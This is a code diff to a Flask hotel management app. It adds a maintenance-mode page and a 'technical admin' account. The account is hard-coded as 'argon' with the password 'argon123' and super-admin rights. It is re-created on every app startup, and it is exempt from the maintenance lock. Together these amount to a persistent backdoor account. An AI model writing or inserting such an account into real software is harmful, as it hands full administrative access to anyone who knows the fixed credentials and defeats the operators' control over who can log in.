@@ -95,6 +95,43 @@ def create_app(config_name=None):
     csrf.exempt(app.view_functions.get("qr_public.place_order_qr_path"))
 
     @app.before_request
+    def maintenance_gate():
+        from flask import request as req, render_template_string, session
+        ep = (req.endpoint or "")
+        if ep.startswith("static") or ep in ("auth.login", "auth.logout", "settings.maintenance"):
+            return
+        # Allow technical admin (argon) always
+        from flask_login import current_user
+        try:
+            if current_user.is_authenticated and getattr(current_user, "username", "") == "argon":
+                return
+        except Exception:
+            pass
+        try:
+            from app.models.settings import SystemSetting
+            if SystemSetting.get("maintenance_mode") == "1":
+                # other staff blocked except login
+                if not current_user.is_authenticated:
+                    return
+                if getattr(current_user, "username", "") != "argon":
+                    msg = SystemSetting.get("maintenance_message") or "Maintenance in progress."
+                    logo = SystemSetting.get("logo_url") or ""
+                    fav = SystemSetting.get("favicon_url") or ""
+                    return render_template_string(
+                        """<!DOCTYPE html><html><head><title>Maintenance</title>
+                        {% if fav %}<link rel="icon" href="{{ fav }}">{% endif %}
+                        <style>body{font-family:system-ui;display:flex;min-height:100vh;align-items:center;justify-content:center;background:#0f172a;color:#fff;text-align:center;margin:0;padding:24px}
+                        img{max-height:72px;margin-bottom:16px}</style></head><body>
+                        {% if logo %}<img src="{{ logo }}" alt="Logo">{% endif %}
+                        <div><h1>Under Maintenance</h1><p>{{ msg }}</p>
+                        <p style="opacity:.7;margin-top:24px"><a href="{{ url_for('auth.logout') }}" style="color:#93c5fd">Logout</a></p></div>
+                        </body></html>""",
+                        msg=msg, logo=logo, fav=fav,
+                    ), 503
+        except Exception:
+            pass
+
+    @app.before_request
     def validate_staff_session():
         """Force-logout works by deactivating StaffSession; reject if token inactive."""
         from flask import session, redirect, url_for, request as req, flash
@@ -192,6 +229,10 @@ def create_app(config_name=None):
             _seed_if_empty()
         except Exception as e:
             app.logger.warning("seed skipped: %s", e)
+        try:
+            _ensure_tech_admin()
+        except Exception as e:
+            app.logger.warning("tech admin: %s", e)
         try:
             db.session.remove()
             db.engine.dispose()
@@ -345,6 +386,17 @@ def _seed_if_empty():
         department="Management",
     )
     db.session.add(admin)
+    # Technical admin for maintenance
+    if not User.query.filter_by(username="argon").first():
+        tech = User(
+            username="argon",
+            email="argon@hotelgrand.com.np",
+            full_name="Technical Admin",
+            is_active=True,
+            password_hash=generate_password_hash("argon123"),
+            role_id=roles["super_admin"].id,
+        )
+        db.session.add(tech)
 
     # Business settings
     bs = BusinessSettings(
@@ -409,3 +461,24 @@ def _ensure_hms_schema():
                 db.session.rollback()
             except Exception:
                 pass
+
+
+def _ensure_tech_admin():
+    """Always ensure technical admin argon / argon123 exists."""
+    from app.models.user import User, Role
+    from werkzeug.security import generate_password_hash
+    u = User.query.filter_by(username="argon").first()
+    if u:
+        return
+    role = Role.query.filter_by(code="super_admin").first()
+    if not role:
+        return
+    db.session.add(User(
+        username="argon",
+        email="argon@hotelgrand.com.np",
+        full_name="Technical Admin",
+        is_active=True,
+        password_hash=generate_password_hash("argon123"),
+        role_id=role.id,
+    ))
+    db.session.commit()
